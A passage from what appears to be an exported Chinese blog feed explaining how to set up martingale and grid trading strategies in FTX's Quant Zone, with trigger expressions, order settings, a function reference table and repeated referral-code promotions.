get_variable("girdStartPrice")</code></p><p>建议再加上其他你觉得合适的触发条件, 不加也可以，启动后会立即执行</p><p>例如我想在当前价小于 30 天均价的时候再购买, 就可以填加这个条件: <code>and price("FTT/USD") &lt; average_price("FTT/USD", 60 * 24 * 30)</code></p><h3 id="执行逻辑"><a href="#执行逻辑" class="headerlink" title="执行逻辑"></a>执行逻辑</h3><h4 id="购买"><a href="#购买" class="headerlink" title="购买"></a>购买</h4><ul><li>订单数量: <code>get_variable("cost") / price("FTT/USD")</code></li><li>限价: <code>get_variable("girdStartPrice")</code></li></ul><blockquote><p>不要勾选 <code>Post Only</code>, 因为触发条件肯定低于这个价格，所以会以更低的价格购买到</p></blockquote><h4 id="设置变量"><a href="#设置变量" class="headerlink" title="设置变量"></a>设置变量</h4><ul><li>买入次数: <code>buyCount = 1</code></li><li>持仓数量: <code>positionAmount = get_variable("cost") / get_variable("girdStartPrice")</code></li></ul><blockquote><p><code>buyCount</code> 每次购买 +1, 每次出售 -1</p></blockquote><h2 id="后续购买策略"><a href="#后续购买策略" class="headerlink" title="后续购买策略"></a>后续购买策略</h2><h3 id="触发条件-2"><a href="#触发条件-2" class="headerlink" title="触发条件"></a>触发条件</h3><ul><li>触发价格不为 0: <code>get_variable("girdStartPrice") != 0</code></li><li>购买次数大于 0: <code>get_variable("buyCount") &gt; 0</code></li><li>当前挂的买单数量小于等于购买次数: <code>get_variable("buyCount") &lt;= get_variable("coverCount")</code></li><li>当前价格低于上一次补仓价格的 <a href="#%E8%AE%BE%E7%BD%AE%E4%B9%B0%E5%85%A5%E7%99%BE%E5%88%86%E6%AF%94">90%</a>: <code>price("FTT/USD") &lt; get_variable("girdStartPrice") * (1 - get_variable("buyPercent")) ** get_variable("buyCount")</code><ul><li>最后一次期望的购买价格: <code>get_variable("girdStartPrice") * (1 - get_variable("buyPercent")) ** get_variable("buyCount")</code></li></ul></li><li>可用 USD 大于每次购买所需的 USD: <code>balance_free("USD") &gt; get_variable("cost")</code></li><li>之前下的买单已完全成交: <code>balance_free("USD") == balance("USD")</code></li><li>其你认为合适的条件，用来增加抄底效果，例如当前价小于日均线的 95%: <code>price("FTT/USD") &lt; average_price("BTC/USD", 60 * 24) * 0.95</code></li></ul><blockquote><p><code>get_variable("girdStartPrice") * (1 - get_variable("buyPercent")) ** get_variable("buyCount")</code> 表示<strong>预期的</strong>上次购买价格，即通过买入次数和买入百分比计算出的最后一次的买入价格，并不是实际最后一次购买价格</p><p>例如策略触发价格设置的很低，那么就会连续低价购买很多次，也就是比网格预期的购买价格低很多，涨上去的时候根据预期网格去卖(一点一点分批卖)</p></blockquote><p>综上:</p><p><code>get_variable("girdStartPrice") != 0 and get_variable("buyCount") &gt; 0 and get_variable("buyCount") &gt; 0 and get_variable("buyCount") &lt;= get_variable("coverCount") and price("FTT/USD") &lt; get_variable("girdStartPrice") * (1 - get_variable("buyPercent")) ** get_variable("buyCount") and balance_free("USD") &gt; get_variable("cost") and balance_free("USD") == balance("USD") and price("FTT/USD") &lt; average_price("BTC/USD", 60 * 24) * 0.95</code></p><h3 id="执行逻辑-1"><a href="#执行逻辑-1" class="headerlink" title="执行逻辑"></a>执行逻辑</h3><h4 id="购买-1"><a href="#购买-1" class="headerlink" title="购买"></a>购买</h4><ul><li>订单数量: <code>get_variable("cost") / price("FTT/USD")</code></li><li>限价: <code>get_variable("girdStartPrice") * (1 - get_variable("buyPercent")) ** get_variable("buyCount")</code></li></ul><blockquote><p>不要勾选 <code>Post Only</code>, 因为触发条件肯定低于这个价格，所以会以更低的价格购买到</p></blockquote><h4 id="设置变量-1"><a href="#设置变量-1" class="headerlink" title="设置变量"></a>设置变量</h4><ul><li>买入次数: <code>buyCount=get_variable("buyCount") + 1</code></li><li>持仓数量: <code>positionAmount = get_variable("positionAmount") + get_variable("cost") / (get_variable("girdStartPrice") * (1 - get_variable("buyPercent")) ** get_variable("buyCount"))</code></li></ul><h2 id="出售策略"><a href="#出售策略" class="headerlink" title="出售策略"></a>出售策略</h2><h3 id="触发条件-3"><a href="#触发条件-3" class="headerlink" title="触发条件"></a>触发条件</h3><ul><li>触发价格不为 0: <code>get_variable("girdStartPrice") != 0</code></li><li>当前挂的买单数大于 0: <code>get_variable("buyCount") &gt; 0</code></li><li>当前价格高于持仓平均价格的 <a href="#%E8%AE%BE%E7%BD%AE%E6%9C%9F%E6%9C%9B%E6%94%B6%E7%9B%8A%E7%99%BE%E5%88%86%E6%AF%94">150%</a>: <code>price("FTT/USD") &gt; (get_variable("cost") * get_variable("buyCount") / get_variable("positionAmount")) * (1 + get_variable("sellPercent"))</code><ul><li>总花费: <code>get_variable("cost") * get_variable("buyCount")</code></li><li>持仓均价: <code>get_variable("cost") * get_variable("buyCount") / get_variable("positionAmount")</code></li></ul></li><li>其他你认为合适的条件，用来增加收益</li></ul><blockquote><p>最后一次购买价通过买入次数和买入百分比计算所得</p><p>因为下买单后，购买次数加 1 了, 所以要 <code>get_variable("buyCount") - 1</code> 表示上一次</p></blockquote><p>综上:</p><p><code>get_variable("girdStartPrice") != 0 and get_variable("buyCount") &gt; 0 and price("FTT/USD") &gt; (get_variable("cost") * get_variable("buyCount") / get_variable("positionAmount")) * (1 + get_variable("sellPercent"))</code></p><h3 id="执行逻辑-2"><a href="#执行逻辑-2" class="headerlink" title="执行逻辑"></a>执行逻辑</h3><h4 id="出售"><a href="#出售" class="headerlink" title="出售"></a>出售</h4><ul><li>订单数量: <code>get_variable("positionAmount")</code></li><li>限价: <code>(get_variable("cost") * get_variable("buyCount") / get_variable("positionAmount")) * (1 + get_variable("sellPercent"))</code></li></ul><p>勾选上<strong>如果已经有一个委托存在，则保留现有订单</strong>, 按照期望挂上单了，坐等交易成功就好</p><blockquote><p>买入时的价格只会比预期更低，所以能买更多的币，这里卖出时按照预期买入的币卖出，未卖出的就一直拿着吧, 行情好手动卖出</p><p>如果想全部卖出，则订单数量设置为可用余额 <code>balance_free("FTT")</code></p></blockquote><h4 id="设置变量-2"><a href="#设置变量-2" class="headerlink" title="设置变量"></a>设置变量</h4><p>重置变量</p><ul><li><code>buyCount = 0</code></li><li><code>positionAmount = 0</code></li></ul><h4 id="停止策略-可选"><a href="#停止策略-可选" class="headerlink" title="停止策略(可选)"></a>停止策略(可选)</h4><p>停止所有策略</p><h3 id="使用-Benson-Sun-的-推荐码-注册-FTX-账号，可以获得-5-的手续费折扣"><a href="#使用-Benson-Sun-的-推荐码-注册-FTX-账号，可以获得-5-的手续费折扣" class="headerlink" title="使用 Benson Sun 的 推荐码 注册 FTX 账号，可以获得 5% 的手续费折扣"></a>使用 <a href="https://twitter.com/FTX_Benson"><strong>Benson Sun</strong></a> 的 <a href="https://ftx.com/#a=BensonTW">推荐码</a> 注册 FTX 账号，<strong>可以获得 <font color="#FF6666">5%</font> 的手续费折扣</strong></h3>]]></content>
      
      
      <categories>
          
          <category> 虚拟货币 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 自动交易 </tag>
            
            <tag> FTX </tag>
            
            <tag> 量化空间 </tag>
            
            <tag> 马丁格尔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FTX 量化空间网格策略</title>
      <link href="/2021/10/07/ftxquantzonegird/"/>
      <url>/2021/10/07/ftxquantzonegird/</url>
      
        <content type="html"><![CDATA[<p>之前介绍了 FTX 交易所量化空间的功能和函数，这次说下如何利用量化空间创建自动网格交易的策略</p><p><img src="/images/FTXCreateStrategy.jpg" alt="创建策略"></p><blockquote><p>使用 <a href="https://twitter.com/FTX_Benson"><strong>Benson Sun</strong></a> 的 <a href="https://ftx.com/#a=BensonTW">推荐码</a> 注册 FTX 账号，<strong>可以获得 <font color="#FF6666">5%</font> 的手续费折扣</strong></p></blockquote><span id="more"></span><h2 id="设定全局变量策略"><a href="#设定全局变量策略" class="headerlink" title="设定全局变量策略"></a>设定全局变量策略</h2><p>首先要创建一个专门设置变量和重新计算变量的策略</p><h3 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h3><p>判断是否设置了网格参数以及刷新计数</p><pre class="line-numbers language-none"><code class="language-none">判断各参数是否设置get_variable("girdStartPrice") == 0 or get_variable("endPrice") == 0 or get_variable("girdCount") == 0 or get_variable("buyPercent") == 0 or get_variable("sellPercent") == 0 or get_variable("cost") == 0 or get_variable("startPrice") == 0 or 判断网格下限是否有变动(修改上面的参数后网格下限会变)get_variable("startPrice") != get_variable("endPrice") * (1 - get_variable("buyPercent")) ** get_variable("girdCount") or 判断当前的持仓订单数量是否变动get_variable("curCount") != get_variable("buyCount") - get_variable("sellCount")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="执行逻辑-仅设置变量"><a href="#执行逻辑-仅设置变量" class="headerlink" title="执行逻辑-仅设置变量"></a>执行逻辑-仅设置变量</h3><h4 id="设置网格策略触发价格"><a href="#设置网格策略触发价格" class="headerlink" title="设置网格策略触发价格"></a>设置网格策略触发价格</h4><p><code>girdStartPrice=60</code></p><p>价格低于这个值才正式开始执行整个网格策略</p><h4 id="设置网格上限"><a href="#设置网格上限" class="headerlink" title="设置网格上限"></a>设置网格上限</h4><p><code>endPrice=120</code></p><p>价格高于这个值就不交易了</p><h4 id="网格数量"><a href="#网格数量" class="headerlink" title="网格数量"></a>网格数量</h4><p><code>girdCount=10</code></p><h4 id="设置买入百分比"><a href="#设置买入百分比" class="headerlink" title="设置买入百分比"></a>设置买入百分比</h4><p><code>buyPercent=0.1</code></p><p>跌到 <code>购买价格 * (1 - buyPercent)</code> 时再买入, 这里我设置的每跌 10% 买一次</p><h4 id="设置出售百分比"><a href="#设置出售百分比" class="headerlink" title="设置出售百分比"></a>设置出售百分比</h4><p><code>sellPercent=0.12</code></p><p>涨到 <code>购买价格 * (1 + sellPercent)</code> 时再卖出, 这里我设置的每涨 12% 就卖</p><h4 id="设置每次买入额"><a href="#设置每次买入额" class="headerlink" title="设置每次买入额"></a>设置每次买入额</h4><p><code>cost=500</code></p><p>我喜欢每次以固定额度买入，有的人喜欢每次买入固定数量，区别不大，逻辑自己稍微调整一下即可</p><h4 id="计算网格下限"><a href="#计算网格下限" class="headerlink" title="计算网格下限"></a>计算网格下限</h4><p>通过网格数量, 网格上限, 每次买入百分比计算网格下限</p><blockquote><p>该变量不会用到，也就看一下，了解下网格区间，手动算也行: <code>上限 * (1 - 买入百分比)^网格数量</code></p></blockquote><p><code>startPrice=get_variable("endPrice") * (1 - get_variable("buyPercent")) ** get_variable("girdCount")</code></p><h4 id="计算当前持有的订单数量"><a href="#计算当前持有的订单数量" class="headerlink" title="计算当前持有的订单数量"></a>计算当前持有的订单数量</h4><p>每次买卖后需要重新计算订单数量</p><p><code>curCount = get_variable("buyCount") - get_variable("sellCount")</code></p><hr><h2 id="第一单策略"><a href="#第一单策略" class="headerlink" title="第一单策略"></a>第一单策略</h2><p>因为要设置触发条件，所以第一单购买单独搞了个策略，如果不需要触发条件，可以去掉这个策略，直接看下一个，但是条件需要微调一下</p><h3 id="触发条件-1"><a href="#触发条件-1" class="headerlink" title="触发条件"></a>触发条件</h3><ul><li>结束价格不为 0: <code>get_variable("endPrice") != 0</code></li><li>购买数量为 0: <code>get_variable("buyCount") == 0</code></li><li>当前价格低于<a href="#%E8%AE%BE%E7%BD%AE%E7%BD%91%E6%A0%BC%E7%AD%96%E7%95%A5%E8%A7%A6%E5%8F%91%E4%BB%B7%E6%A0%BC">网格触发价格</a>: <code>price("FTT/USD") &lt;= get_variable("girdStartPrice")</code></li><li>其他你认为合适的触发条件，用来提高收益, 例如我想在当前价小于 30 天均价的时候再购买, 就可以填加这个条件: <code>and price("FTT/USD") &lt; average_price("FTT/USD", 60 * 24 * 30)</code></li></ul><p>综上:</p><p><code>get_variable("endPrice") != 0 and get_variable("buyCount") == 0 and price("FTT/USD") &lt;= get_variable("girdStartPrice")</code></p><h3 id="执行逻辑"><a href="#执行逻辑" class="headerlink" title="执行逻辑"></a>执行逻辑</h3><h4 id="购买"><a href="#购买" class="headerlink" title="购买"></a>购买</h4><ul><li>订单数量: <code>get_variable("cost") / price("FTT/USD")</code></li><li>限价: <code>get_variable("girdStartPrice")</code></li></ul><blockquote><p>下面的三个选项都不要勾选, 因为触发条件肯定低于这个价格，所以会以更低的价格购买到</p><p>如果已经有一个委托存在, 勾选<code>保留现有订单</code></p></blockquote><h4 id="设置变量"><a href="#设置变量" class="headerlink" title="设置变量"></a>设置变量</h4><ul><li>买入次数: <code>buyCount = 1</code></li></ul><blockquote><p><code>buyCount</code> 每次购买 +1</p></blockquote><h4 id="暂停策略"><a href="#暂停策略" class="headerlink" title="暂停策略"></a>暂停策略</h4><p>暂停当前策略 1 分钟，给设置变量策略一点时间去计算持有订单的数量</p><hr><h2 id="后续购买策略"><a href="#后续购买策略" class="headerlink" title="后续购买策略"></a>后续购买策略</h2><h3 id="触发条件-2"><a href="#触发条件-2" class="headerlink" title="触发条件"></a>触发条件</h3><ul><li>网格上限价格不为 0: <code>get_variable("endPrice") != 0</code></li><li>购买次数大于 0: <code>get_variable("buyCount") &gt; 0</code></li><li>当前挂的买单数量大于 0: <code>get_variable("curCount") &gt; 0</code></li><li>当前挂的买单数量小于等于网格数量: <code>get_variable("curCount") &lt;= get_variable("girdCount")</code></li><li>当前价格低于最后一次期望购买价格的 <a href="#%E8%AE%BE%E7%BD%AE%E4%B9%B0%E5%85%A5%E7%99%BE%E5%88%86%E6%AF%94">90%</a>: <code>price("FTT/USD") &lt; get_variable("endPrice") * (1 - get_variable("buyPercent")) ** get_variable("curCount")</code><ul><li>最后一次期望的购买价格: <code>get_variable("endPrice") * (1 - get_variable("buyPercent")) ** get_variable("curCount")</code></li></ul></li><li>可用 USD 大于每次购买所需的 USD: <code>balance_free("USD") &gt; get_variable("cost")</code></li><li>之前下的买单已完全成交: <code>balance_free("USD") == balance("USD")</code></li><li>其你认为合适的条件，用来增加抄底效果，例如当前价小于日均线的 95%: <code>price("FTT/USD") &lt; average_price("FTT/USD", 60 * 24) * 0.95</code></li></ul><blockquote><p><code>get_variable("endPrice") * (1 - get_variable("buyPercent")) ** get_variable("curCount")</code> 表示<strong>预期的</strong>上次购买价格，即通过买入次数和买入百分比计算出的最后一次的买入价格，并不是实际最后一次购买价格</p><p>例如策略触发价格设置的很低，那么就会连续低价购买很多次，也就是比网格预期的购买价格低很多，涨上去的时候根据预期网格去卖(一点一点分批卖)</p></blockquote><p>综上:</p><p><code>get_variable("endPrice") != 0 and get_variable("buyCount") &gt; 0 and get_variable("curCount") &gt; 0 and get_variable("curCount") &lt;= get_variable("girdCount") and price("FTT/USD") &lt; get_variable("endPrice") * (1 - get_variable("buyPercent")) ** get_variable("curCount") and balance_free("USD") &gt; get_variable("cost") and balance_free("USD") == balance("USD") and price("FTT/USD") &lt; average_price("FTT/USD", 60 * 24) * 0.95</code></p><h3 id="执行逻辑-1"><a href="#执行逻辑-1" class="headerlink" title="执行逻辑"></a>执行逻辑</h3><h4 id="购买-1"><a href="#购买-1" class="headerlink" title="购买"></a>购买</h4><ul><li>订单数量: <code>get_variable("cost") / price("FTT/USD")</code></li><li>限价: <code>get_variable("endPrice") * (1 - get_variable("buyPercent")) ** get_variable("curCount")</code></li></ul><blockquote><p>下面的三个选项都不要勾选, 因为触发条件肯定低于这个价格，所以会以更低的价格购买到</p><p>如果已经有一个委托存在, 勾选<code>保留现有订单</code></p></blockquote><h4 id="设置变量-1"><a href="#设置变量-1" class="headerlink" title="设置变量"></a>设置变量</h4><ul><li>买入次数: <code>buyCount = get_variable("buyCount") + 1</code></li></ul><blockquote><p><code>buyCount</code> 每次购买 +1</p></blockquote><h4 id="暂停策略-1"><a href="#暂停策略-1" class="headerlink" title="暂停策略"></a>暂停策略</h4><p>暂停当前策略 1 分钟，给设置变量策略一点时间去计算持有订单的数量</p><hr><h2 id="后续出售策略"><a href="#后续出售策略" class="headerlink" title="后续出售策略"></a>后续出售策略</h2><h3 id="触发条件-3"><a href="#触发条件-3" class="headerlink" title="触发条件"></a>触发条件</h3><ul><li>网格上限价格不为 0: <code>get_variable("endPrice") != 0</code></li><li>当前挂的买单数大于 1, 最后一单留着看行情手动卖出: <code>get_variable("curCount") &gt; 1</code></li><li>当前价格高于于最后一次次购买价格的 <a href="#%E8%AE%BE%E7%BD%AE%E5%87%BA%E5%94%AE%E7%99%BE%E5%88%86%E6%AF%94">112%</a>: <code>price("FTT/USD") &gt; (get_variable("endPrice") * (1 - get_variable("buyPercent")) ** (get_variable("curCount") - 1)) * (1 + get_variable("sellPercent"))</code><ul><li>最后一次购买价: <code>get_variable("endPrice") * (1 - get_variable("buyPercent")) ** (get_variable("curCount") - 1)</code></li></ul></li><li>其他你认为合适的条件，用来增加收益</li></ul><blockquote><p>最后一次购买价通过买入次数和买入百分比计算所得</p><p>因为下买单后，购买次数加 1 了, 所以要 <code>get_variable("curCount") - 1</code> 表示上一次</p></blockquote><p>综上:</p><p><code>get_variable("endPrice") != 0 and get_variable("curCount") &gt; 1 and price("FTT/USD") &gt; (get_variable("endPrice") * (1 - get_variable("buyPercent")) ** (get_variable("curCount") - 1)) * (1 + get_variable("sellPercent"))</code></p><h3 id="执行逻辑-2"><a href="#执行逻辑-2" class="headerlink" title="执行逻辑"></a>执行逻辑</h3><h4 id="出售"><a href="#出售" class="headerlink" title="出售"></a>出售</h4><ul><li>订单数量: <code>get_variable("cost") / (get_variable("endPrice") * (1 - get_variable("buyPercent")) ** (get_variable("curCount") - 1))</code></li><li>限价: <code>(get_variable("endPrice") * (1 - get_variable("buyPercent")) ** (get_variable("curCount") - 1)) * (1 + get_variable("sellPercent"))</code></li></ul><p>勾选上<strong>如果已经有一个委托存在，则保留现有订单</strong>, 按照期望挂上单了，坐等交易成功就好</p><blockquote><p>买入时的价格只会比预期更低，所以能买更多的币，这里卖出时按照预期买入的币卖出，未卖出的就一直拿着吧, 行情好手动卖出</p></blockquote><h4 id="设置变量-2"><a href="#设置变量-2" class="headerlink" title="设置变量"></a>设置变量</h4><ul><li>出售次数: <code>sellCount = get_variable("sellCount") + 1</code></li></ul><blockquote><p><code>sellCount</code> 每次出售 +1</p></blockquote><h4 id="暂停策略-2"><a href="#暂停策略-2" class="headerlink" title="暂停策略"></a>暂停策略</h4><p>暂停当前策略 1 分钟，给设置变量策略一点时间去计算持有订单的数量</p><hr><h3 id="使用-Benson-Sun-的-推荐码-注册-FTX-账号，可以获得-5-的手续费折扣"><a href="#使用-Benson-Sun-的-推荐码-注册-FTX-账号，可以获得-5-的手续费折扣" class="headerlink" title="使用 Benson Sun 的 推荐码 注册 FTX 账号，可以获得 5% 的手续费折扣"></a>使用 <a href="https://twitter.com/FTX_Benson"><strong>Benson Sun</strong></a> 的 <a href="https://ftx.com/#a=BensonTW">推荐码</a> 注册 FTX 账号，<strong>可以获得 <font color="#FF6666">5%</font> 的手续费折扣</strong></h3><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="/images/FTXQuantZoneGird.png"></p><h2 id="止盈策略"><a href="#止盈策略" class="headerlink" title="止盈策略"></a>止盈策略</h2><p>直接全部卖出而已, 大同小异</p><h3 id="触发条件-4"><a href="#触发条件-4" class="headerlink" title="触发条件"></a>触发条件</h3><h4 id="执行逻辑-3"><a href="#执行逻辑-3" class="headerlink" title="执行逻辑"></a>执行逻辑</h4><h4 id="设置变量-3"><a href="#设置变量-3" class="headerlink" title="设置变量"></a>设置变量</h4><!-- 个人比较菜，没有止损习惯，也没有好的止损想法...纯设置的话可以参考[止盈策略](#止盈策略) -->]]></content>
      
      
      <categories>
          
          <category> 虚拟货币 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 自动交易 </tag>
            
            <tag> FTX </tag>
            
            <tag> 量化空间 </tag>
            
            <tag> 网格交易 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FTX 量化空间</title>
      <link href="/2021/09/29/ftxquantzone/"/>
      <url>/2021/09/29/ftxquantzone/</url>
      
        <content type="html"><![CDATA[<p>FTX 交易所是一家排名前 5 的、非常适合做对冲交易的交易所. 并且它有一个非常棒的功能: 量化空间. 即使你没有服务器，没有交易系统，不会编程，也可以用它来创建你的自动交易机器人.</p><p>进入 FTX 网页版后按下面操作即可创建量化策略</p><p><img src="/images/FTXCreateStrategy.jpg" alt="创建策略"></p><blockquote><p>使用 <a href="https://twitter.com/FTX_Benson"><strong>Benson Sun</strong></a> 的 <a href="https://ftx.com/#a=BensonTW">推荐码</a> 注册 FTX 账号，<strong>可以获得 <font color="#FF6666">5%</font> 的手续费折扣</strong></p></blockquote><span id="more"></span><h2 id="策略设置"><a href="#策略设置" class="headerlink" title="策略设置"></a>策略设置</h2><p>启用的策略会每 15 秒钟判断一次<a href="#%E8%A7%A6%E5%8F%91%E9%80%BB%E8%BE%91">触发逻辑</a>, 当触发逻辑成立时(结果为 <code>true</code>), 则会执行该策略后续的<a href="#%E6%89%A7%E8%A1%8C%E9%80%BB%E8%BE%91">执行逻辑</a>部分, 否则不会执行</p><h3 id="策略名称"><a href="#策略名称" class="headerlink" title="策略名称"></a>策略名称</h3><p>就是起个名, 方便查找方便一看就知道干啥用的</p><h3 id="触发逻辑"><a href="#触发逻辑" class="headerlink" title="触发逻辑"></a>触发逻辑</h3><p>就是执行这个策略的条件，满足条件就会执行这个策略后面的内容</p><p>这里面填入结果为<code>真(true)</code>或<code>假(false)</code>的<a href="#%E5%8F%AF%E7%94%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F">表达式</a>, 后面有各种可用的<a href="#%E5%8F%AF%E7%94%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F">表达式</a>，你可以随意组合，只要表达式结果是 <code>true</code> 或 <code>false</code> 即可</p><blockquote><p><code>真(true)</code>: 表示条件成立, 则继续执行后面的<a href="#%E6%89%A7%E8%A1%8C%E9%80%BB%E8%BE%91">执行逻辑</a><br><code>假(false)</code>: 表示条件不成立, 不再执行后续逻辑</p></blockquote><h3 id="执行逻辑"><a href="#执行逻辑" class="headerlink" title="执行逻辑"></a>执行逻辑</h3><blockquote><p><strong>一个策略可以添加多个执行逻辑</strong></p></blockquote><p>执行逻辑分为多种类型: 开仓, 平仓, <a href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AE%A2%E5%8D%95">下自定义订单</a>, 取消自定义订单, 暂停策略, 重启策略, <a href="#%E8%AE%BE%E5%AE%9A%E5%8F%98%E9%87%8F">设定变量</a></p><p>这里主要说<a href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AE%A2%E5%8D%95">自定义订单</a>和<a href="#%E8%AE%BE%E5%AE%9A%E5%8F%98%E9%87%8F">设定变量</a></p><h4 id="自定义订单"><a href="#自定义订单" class="headerlink" title="自定义订单"></a>自定义订单</h4><p>委托类型，交易方向，市场就不说了，手动交易过的人都知道…</p><p>我要说的是订单数量和限价(限价委托的话)也是可以填<a href="#%E5%8F%AF%E7%94%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F">表达式</a>的, 只要表达式返回结果是相应数字就行</p><blockquote><p>订单数量: 购买/出售货币的数量</p><p>限价: 交易价格</p></blockquote><h4 id="设定变量"><a href="#设定变量" class="headerlink" title="设定变量"></a>设定变量</h4><p>变量值也可以填<a href="#%E5%8F%AF%E7%94%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F">表达式</a>, 结果是啥都行，只要引用变量的时候注意就好啦！</p><blockquote><p><font color="#FF6666">变量可以跨策略使用！！！</font></p></blockquote><h3 id="使用-Benson-Sun-的-推荐码-注册-FTX-账号，可以获得-5-的手续费折扣"><a href="#使用-Benson-Sun-的-推荐码-注册-FTX-账号，可以获得-5-的手续费折扣" class="headerlink" title="使用 Benson Sun 的 推荐码 注册 FTX 账号，可以获得 5% 的手续费折扣"></a>使用 <a href="https://twitter.com/FTX_Benson"><strong>Benson Sun</strong></a> 的 <a href="https://ftx.com/#a=BensonTW">推荐码</a> 注册 FTX 账号，<strong>可以获得 <font color="#FF6666">5%</font> 的手续费折扣</strong></h3><h2 id="可用表达式"><a href="#可用表达式" class="headerlink" title="可用表达式"></a>可用表达式</h2><h3 id="市场数据"><a href="#市场数据" class="headerlink" title="市场数据"></a>市场数据</h3><table><thead><tr><th align="left">函数</th><th align="right">作用</th></tr></thead><tbody><tr><td align="left"><code>price("ETH/USDT")</code></td><td align="right">当前价格</td></tr><tr><td align="left"><code>price("ETH/USDT", n)</code></td><td align="right"><code>n</code> 分钟前的价格</td></tr><tr><td align="left"><code>average_price("ETH/USDT", n)</code></td><td align="right">过去 <code>n</code> 分钟的均价</td></tr><tr><td align="left"><code>ewma_price("ETH-PERP", n)</code></td><td align="right">半衰期为前 <code>n</code> 分钟价格的 EWMA</td></tr><tr><td align="left"><code>bid_price("ETH-PERP")</code></td><td align="right">最佳买盘价格</td></tr><tr><td align="left"><code>offer_price("ETH-PERP")</code></td><td align="right">最佳卖盘价格</td></tr><tr><td align="left"><code>last_trade_price("ETH-PERP")</code></td><td align="right">最后交易价格</td></tr><tr><td align="left"><code>index_price("ETH-PERP")</code></td><td align="right">指数价格</td></tr><tr><td align="left"><code>index_price("ETH-PERP", n)</code></td><td align="right"><code>n</code> 分钟前的指数价格</td></tr><tr><td align="left"><code>average_index_price("ETH-PERP")</code></td><td align="right">过去 <code>n</code> 分钟，指数的平均价格</td></tr><tr><td align="left"><code>ewma_index_price("ETH-PERP", n)</code></td><td align="right">半衰期为前 <code>n</code> 分钟指数价格的 EWMA</td></tr><tr><td align="left"><code>premium("ETH-PERP")</code></td><td align="right">合约溢价(<code>标记价格/指数价格</code>)</td></tr><tr><td align="left"><code>volume("ETH/USDT")</code></td><td align="right">过去 24 小时的交易量(以报价货币作为计量单位)</td></tr><tr><td align="left"><code>volume("ETH/USDT", n)</code></td><td align="right">过去 <code>n</code> 分钟的交易量(以报价货币作为计量单位)</td></tr><tr><td align="left"><code>base_volume("ETH/USDT")</code></td><td align="right">过去 24 小时的交易量(以基础货币作为计量单位)</td></tr><tr><td align="left"><code>base_volume("ETH/USDT", n)</code></td><td align="right">过去 <code>n</code> 分钟的交易量(以基础货币作为计量单位)</td></tr><tr><td align="left"><code>max_price("ETH/USDT")</code></td><td align="right">过去 10 分钟的最高价格</td></tr><tr><td align="left"><code>max_price("ETH/USDT", n)</code></td><td align="right">过去 <code>n</code> 分钟的最高价格</td></tr><tr><td align="left"><code>min_price("ETH/USDT")</code></td><td align="right">过去 10 分钟的最低价格</td></tr><tr><td align="left"><code>min_price("ETH/USDT", n)</code></td><td align="right">过去 <code>n</code> 分钟的最低价格</td></tr><tr><td align="left"><code>todays_move_price()</code></td><td align="right">Market price of the daily MOVE contract expiring today.</td></tr><tr><td align="left"><code>todays_move()</code></td><td align="right">Name of the daily MOVE contract expiring today.</td></tr><tr><td align="left"><code>tomorrows_move_price()</code></td><td align="right">Market price of the daily MOVE contract expiring tomorrow.</td></tr><tr><td align="left"><code>tomorrows_move()</code></td><td align="right">Name of the daily MOVE contract expiring tomorrow.</td></tr><tr><td align="left"><code>this_weeks_move_price()</code></td><td align="right">Market price of the weekly MOVE contract expiring this week.</td></tr><tr><td align="left"><code>this_weeks_move()</code></td><td align="right">Name of the weekly MOVE contract expiring this week.</td></tr><tr><td align="left"><code>next_weeks_move_price()</code></td><td align="right">Market price of the weekly MOVE contract expiring next week.</td></tr><tr><td align="left"><code>next_weeks_move()</code></td><td align="right">Name of the weekly MOVE contract expiring next week.</td></tr><tr><td align="left"><code>this_quarters_move_price()</code></td><td align="right">Market price of the quarterly MOVE contract expiring this quarter.</td></tr><tr><td align="left"><code>this_quarters_move()</code></td><td align="right">Name of the quarterly MOVE contract expiring this quarter.</td></tr><tr><td align="left"><code>next_quarters_move_price()</code></td><td align="right">Market price of the quarterly MOVE contract expiring next quarter.</td></tr><tr><td align="left"><code>next_quarters_move()</code></td><td align="right">Name of the quarterly MOVE contract expiring next quarter.</td></tr></tbody></table><blockquote><p><code>EWMA</code>: 哪个大佬知道啥意思，或者计算公式是什么呀？</p><p><code>指数价格</code>: 选择三家以上的主流交易所相应币对, 做为权重成分计算而得. 你可以理解该价格为对应币种在多个大型交易所里的平均市场价格, 它是合约交易所要锚定的价格. 比如: 币本位保证金合约锚定标的货币的美元指数; USDT 保证金合约锚定标的货币的 USDT 指数.</p><p><code>标记价格</code>: 是根据指数价格和基差的移动平均值加和计算而来，它主要用于账户盈亏和清结算的计算.</p></blockquote><h3 id="账户数据"><a href="#账户数据" class="headerlink" title="账户数据"></a>账户数据</h3><table><thead><tr><th align="left">函数</th><th align="right">作用</th></tr></thead><tbody><tr><td align="left"><code>collateral</code></td><td align="right">账户保证金总额(USD)</td></tr><tr><td align="left"><code>free_collateral</code></td><td align="right">可用的账户保证金(USD)</td></tr><tr><td align="left"><code>total_position_size</code></td><td align="right">所有合约的总账户仓位规模(USD)</td></tr><tr><td align="left"><code>margin_fraction</code></td><td align="right">账户保证金比例(<code>账户总持仓量/保证金</code>)</td></tr><tr><td align="left"><code>open_margin_fraction</code></td><td align="right">账户保证金比例包括当前委托但未交易(<code>(账户总持仓量+挂单量)/保证金</code>)</td></tr><tr><td align="left"><code>leverage</code></td><td align="right">账户杠杆的约值(<code>账户保证金/总仓位</code>)</td></tr><tr><td align="left"><code>initial_mfr</code></td><td align="right">账户初始保证金比例要求</td></tr><tr><td align="left"><code>maintenance_mfr</code></td><td align="right">账户维持保证金比例要求</td></tr><tr><td align="left"><code>liquidation_distance</code></td><td align="right">大约被清算的距离</td></tr></tbody></table><h3 id="仓位数据"><a href="#仓位数据" class="headerlink" title="仓位数据"></a>仓位数据</h3><table><thead><tr><th 